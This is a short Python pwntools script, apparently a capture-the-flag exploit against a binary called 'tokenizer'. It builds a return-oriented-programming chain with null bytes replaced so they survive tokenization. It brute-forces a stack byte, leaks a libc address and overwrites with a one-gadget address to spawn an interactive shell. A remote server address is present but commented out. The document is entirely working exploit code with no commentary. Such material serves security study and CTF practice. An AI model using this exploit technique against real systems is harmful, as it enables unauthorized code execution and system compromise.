from pwn import *


libc = ELF("./libc-2.27.so")

k = 0xb0

prdi = 0x000000000040149b
prsi_r15 = 0x0000000000401499

pay = p64(prdi) + p64(0x0000000000404020) + p64(prsi_r15) + p64(0x0000000000403F98) + p64(0) + p64(0x401080) +  p64(0x40133c)
pay = pay.replace("\x00",chr(k))

pay = chr(k)*0x378+pay
pay = pay.ljust(0x400,chr(k))

while True:
	#p = remote("165.22.57.24",32000)
	p = process("./tokenizer")

	p.sendline(pay)

	try:
		stack = u64(p.recvuntil("\x7f",timeout=0.5)[-6:]+"\x00\x00")
		print hex(stack)
	except:
		p.close()
		continue

	p.sendline(p8(stack&0xff)) 

	if (stack&0xff == k):
		break
	p.close()

p.recvuntil("\x7f")
libcbase = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - libc.symbols["strsep"]

print "libc : " + hex(libcbase)

k = p64(libcbase+0x10a38c) * 128
p.sendline(k.replace('\x00','\x38'))
p.sendlineafter(":",'\x38')

p.interactive()
